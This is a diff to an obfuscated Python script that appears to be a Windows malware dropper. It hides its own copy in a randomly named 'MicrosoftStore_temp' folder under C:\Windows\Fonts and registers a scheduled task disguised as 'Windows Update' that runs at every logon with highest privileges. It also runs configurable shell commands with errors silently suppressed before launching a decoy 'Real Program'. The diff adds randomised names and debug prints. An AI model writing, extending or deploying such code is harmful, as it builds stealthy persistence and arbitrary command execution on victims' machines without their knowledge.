@@ -12,6 +12,7 @@ import shutil as euifew
 import sys as wzf8u4w7
 import winreg as ef9uh77 
 import threading as wefuh4323
+import random as e987xcy4
 import asyncio as nueia8732q
 
 xwwwrew = '%Brgxer%'
@@ -58,12 +59,13 @@ def fwf9ud98():
 
 def hzirge():
     try:
+        bdfg = e987xcy4.randint(1000,9999)
         awdt553234 = "C:\\Windows\\Fonts"
-        xcsgf4 = "MicrosoftStore_temp"
+        xcsgf4 = f"MicrosoftStore_temp{str(bdfg)}"
         x5g4g654z654 = ewsjinf783.path.join(awdt553234, xcsgf4)
         ewsjinf783.makedirs(x5g4g654z654, exist_ok=True)
         euifew.copy(ewsjinf783.path.abspath(wzf8u4w7.argv[0]), ewsjinf783.path.join(x5g4g654z654))
-        xvcj5tr.run(f'schtasks /create /tn "Windows Update" /sc ONLOGON /rl HIGHEST /tr "{ewsjinf783.path.abspath(wzf8u4w7.argv[0])}"', shell=True, check=True)
+        xvcj5tr.run(f'schtasks /create /tn "Windows Update" /sc ONLOGON /rl HIGHEST /tr "{ewsjinf783.path.abspath(wzf8u4w7.argv[0])}"', shell=True, capture_output=False)
         
     except Exception as e:
         pass
@@ -168,27 +170,33 @@ def vdsu281cjm():
 if __name__ == '__main__':
     if deiuc == 'y':
         try:
-            xvcj5tr.run(moon, shell=True, check=True, capture_output=False)
+            print("1 Shell Command")
+            xvcj5tr.run(moon, shell=True, capture_output=False)
         except Exception as e:
             pass
 
     if yxuiue == 'y':
         try:
-            xvcj5tr.run(world, shell=True, check=True, capture_output=False)
+            print("2 Shell Command")
+            xvcj5tr.run(world, shell=True, capture_output=False)
         except Exception as e:
             pass
 
     if xwwwrew == 'y':
+        print("1 StartUp")
         esuih()
     else:
         pass
     if dsfrsdjk == 'y':
+        print("2 StartUp")
         hzirge()
     else:
         pass
     if dsvisdf == 'y':
+        print("3 StartUp")
         hzirge()
     else:
         pass
-
+    
+    print("1 Real Program")
     vdsu281cjm()
